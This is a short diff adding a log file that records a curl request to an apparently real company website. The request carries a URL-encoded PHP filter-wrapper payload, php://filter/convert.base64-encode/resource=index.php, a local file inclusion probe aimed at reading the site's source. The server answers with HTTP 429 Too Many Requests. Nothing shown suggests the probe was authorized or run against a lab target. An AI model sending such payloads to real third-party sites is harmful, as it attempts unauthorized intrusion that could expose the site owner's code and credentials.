@@ -1,0 +1,9 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://www.infinitycapital.bh/contact?q=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php'
+# exit_code: 0
+# ---
+
+Too Many Requests
+
+Too Many Requests
+bom1::vh49j-1790749353004-9640c1e27f6d
+HTTP_STATUS:429
